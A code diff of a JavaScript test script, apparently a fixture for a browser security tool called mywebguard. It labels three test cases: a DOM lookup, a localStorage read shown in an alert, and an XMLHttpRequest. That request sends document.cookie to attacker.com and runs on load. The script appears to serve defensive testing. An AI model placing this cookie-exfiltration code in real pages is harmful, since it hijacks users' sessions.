@@ -1,9 +1,13 @@
-var fromStorage = localStorage.getItem('test');
-alert("This was retrieved from script.js "+JSON.stringify(fromStorage));
-console.log(fromStorage);
+//test case 1: document.getElementById
+document.getElementById("malicious");
 
+//test case 2: localStorage.getItem
 
-function loadDoc() {
+alert("Debug from https://mywebguard-thirdparty.github.io: localStorage.getItem('mywebguard')="+
+      localStorage.getItem('mywebguard'));
+
+//test case 3: ajax
+function ajaxTest() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
@@ -14,7 +18,4 @@ function loadDoc() {
   xhttp.open("GET", "https://attacker.com/?cookie="+document.cookie, true);
   xhttp.send();
 }
-	loadDoc();
-
-
-document.getElementById("malicious");
+ajaxTest();
